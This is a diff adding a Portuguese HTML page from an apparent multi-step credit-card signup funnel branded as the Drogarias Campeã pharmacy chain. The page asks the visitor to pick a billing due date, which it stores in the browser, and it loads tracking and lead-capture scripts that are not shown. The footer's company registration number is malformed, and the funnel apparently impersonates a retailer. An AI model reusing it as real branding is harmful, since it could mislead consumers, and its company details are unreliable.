@@ -1,0 +1,170 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/ml/progress.js"></script><script src="/api/public/pixel.js"></script><script src="/ml/lead-capture.js" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <title>Cartão</title>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script src="/ml/utmify.js"></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #f2f2f2;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #d5d8dd;
+            background-color: #e9ebee;
+        }
+        .header img {
+            width: 125px;
+            padding: 10px;
+        }
+        .logo {
+            margin-left: 20px;
+        }
+        .content {
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .info-box {
+            background-color: #e8f5e9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            color: #333;
+        }
+        .warning-box {
+            background-color: #fff3e0;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            text-align: center;
+            color: #333;
+        }
+        .button {
+            background-color: #14315c;
+            color: #ffffff;
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            width: 100%;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .quiz-container {
+            margin: 0 auto;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: #ebebeb;
+            margin-top: 10px;
+        }
+    </style>
+<style id="lov-white-bg">html,body{background-color:#fff !important;background-image:none !important;}</style>
+</head>
+<body>
+    <div class="header">
+        <img src="images/logo.png" alt="Logo Drogarias Campeã" class="logo">
+    </div>
+
+    <div class="content">
+        <h1>Entenda como funciona seu limite</h1>
+        
+        <p class="subtitle">
+            Saiba como seu limite de crédito pode aumentar ou diminuir
+        </p>
+
+        <div class="info-box" style="border: 1px solid #07d000;">
+            <strong>Aumento de Limite</strong><br>
+            Caso você realize o pagamento das faturas em dia, seu limite será aumentado constantemente.
+        </div>
+
+        <div class="warning-box" style="border: 1px solid #ffbf00;">
+            <strong>Redução de Limite</strong><br>
+            No entanto, se houver atraso no pagamento das faturas, o limite poderá ser reduzido.
+        </div>
+
+        <button onclick="showDateSelection()" class="button">
+            Concordo
+        </button>
+        <script>
+            function showDateSelection() {
+                const content = document.querySelector('.content');
+                content.innerHTML = `
+                    <div class="quiz-container" style="text-align: left; background-color: #ffffff; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+                        <h1 style="text-align: left; margin-top: 0px;">Escolha a melhor data</h1>
+                        <p class="subtitle" style="text-align: left;">Selecione o melhor dia para o vencimento da sua fatura</p>
+                        <button onclick="selecionarData(5)" class="button" style="margin-bottom: 10px;">Dia 5</button>
+                        <button onclick="selecionarData(10)" class="button" style="margin-bottom: 10px;">Dia 10</button>
+                        <button onclick="selecionarData(15)" class="button" style="margin-bottom: 10px;">Dia 15</button>
+                        <button onclick="selecionarData(25)" class="button" style="margin-bottom: 10px;">Dia 25</button>
+                        <button onclick="selecionarData(30)" class="button">Dia 30</button>
+                    </div>
+                `;
+            }
+
+            function selecionarData(dia) {
+                localStorage.setItem('diaVencimento', dia);
+                window.location.href = buildUrlWithParams('../9/index.html');
+            }
+        </script>
+    </div>
+
+    <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto;">
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Drogarias Campeã Brasil LTDA | CNPJ: 79.379.491.0008-50
+            </p>
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+            </p>
+            <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                © 2025 - Todos os direitos reservados
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location);
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+    </script>
+
+
+
+</body></html>
